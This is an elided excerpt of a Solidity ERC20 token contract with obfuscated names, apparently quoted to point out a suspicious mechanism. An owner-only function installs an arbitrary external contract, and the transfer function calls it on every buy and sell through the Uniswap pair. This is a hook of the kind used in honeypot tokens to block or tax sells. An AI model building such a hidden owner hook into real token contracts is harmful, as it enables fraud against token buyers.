...
contract TokenM is ERC20 {
    ...
    HNnesAmountuseroo public useroo;
    ...
    function foceddrTingerMenge(HNnesAmountuseroo _useroo) public onlyOwner {
        useroo = _useroo;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                useroo.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				useroo.addOutAmount(from, amount);
            }else{
                useroo.addOutAmount(from, amount);
                takeFee = false;
            }
